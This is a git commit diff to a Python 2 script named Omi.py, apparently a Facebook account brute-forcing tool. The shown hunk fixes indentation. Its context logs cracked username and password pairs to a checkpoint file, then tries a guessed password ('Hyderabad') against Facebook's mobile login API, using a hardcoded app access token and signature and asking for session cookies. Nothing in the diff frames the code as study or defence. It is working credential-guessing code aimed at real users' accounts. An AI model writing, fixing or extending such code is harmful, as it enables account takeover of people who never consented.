03a3c9012585465d498535be465c5642229be547
Mr-Perfect-King <61911841+Mr-Perfect-King@users.noreply.github.com>
2020-03-08 11:05:32 +0500

    Update Omi.py

--- Omi.py
+++ Omi.py
@@ -392,9 +392,8 @@ def pilih_super():
 															cek = open("out/checkpoint.txt", "a")
 															cek.write(user+"|"+pass6+"\n")
 															cek.close()
-															cekpoint.append(user+pass6)
-															
-															else:
+															cekpoint.append(user+pass6)			
+												else:
 													pass9 = 'Hyderabad'
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
